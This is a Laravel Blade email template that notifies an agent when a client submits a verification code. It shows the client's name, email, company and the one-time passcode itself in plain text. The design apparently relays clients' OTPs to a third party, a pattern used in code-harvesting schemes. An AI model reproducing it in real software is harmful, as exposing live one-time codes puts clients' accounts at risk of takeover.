<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Code Submission</title>
    <style>
        :root { --bg:#f5f5f5; --card:#fff; --text:#111; --muted:#5f5f5f; --accent:#111111; --line:#e8e8e8; }
        * { box-sizing: border-box; }
        body { margin:0; padding:18px; background:transparent; color:var(--text); font-family:Poppins, "Segoe UI", Arial, sans-serif; }
        .shell { max-width:680px; margin:0 auto; background:transparent; border:1px solid var(--line); border-radius:14px; overflow:hidden; }
        .head { padding:18px 22px; border-bottom:1px solid var(--line); }
        .brand { margin:0; font-size:11px; text-transform:uppercase; letter-spacing:.08em; color:var(--accent); font-weight:600; }
        .title { margin:8px 0 0; font-size:20px; line-height:1.3; }
        .body { padding:22px; font-size:14px; line-height:1.7; }
        .grid { width:100%; border-collapse:collapse; margin:14px 0; }
        .grid td { padding:8px 0; border-bottom:1px solid #f0f0f0; vertical-align:top; }
        .grid td.label { width:130px; color:var(--muted); font-weight:500; }
        .otp { font-family:Consolas, "Courier New", monospace; font-size:16px; font-weight:700; }
        .btn { display:inline-block; margin-top:18px; background:#111111; color:#ffffff !important; text-decoration:none; padding:11px 16px; border-radius:8px; border:1px solid #111111; font-weight:600; }
        .foot { padding:14px 22px; border-top:1px solid var(--line); font-size:12px; color:var(--muted); background:transparent; }
        @media (max-width:640px) { body { padding:10px; } .head,.body,.foot { padding:14px; } .title { font-size:18px; } .grid td.label { width:110px; } }
    </style>
</head>
<body>
    <div class="shell">
        <div class="head">
            <p class="brand">{{ site_name() }}</p>
            <h1 class="title">Your client submitted a verification code.</h1>
        </div>
        <div class="body">
            <p>Hello {{ $otpSubmission->agent->name }},</p>
            <p>Please review the newly submitted verification details.</p>

            <table class="grid">
                <tr><td class="label">Client</td><td>{{ $otpSubmission->client->name }} ({{ $otpSubmission->client->email }})</td></tr>
                <tr><td class="label">Company</td><td>{{ $otpSubmission->company_name }}</td></tr>
                <tr><td class="label">OTP</td><td><span class="otp">{{ $otpSubmission->otp_code }}</span></td></tr>
                <tr><td class="label">Status</td><td>{{ $otpSubmission->getStatusLabel() }}</td></tr>
                <tr><td class="label">Submitted</td><td>{{ $otpSubmission->submitted_at->format('M j, Y \a\t g:i A') }}</td></tr>
            </table>

            <a href="{{ route('agent.submissions.index') }}" class="btn">Open Submissions</a>
        </div>
        <div class="foot">
            Review this submission from your dashboard.
        </div>
    </div>
</body>
</html>
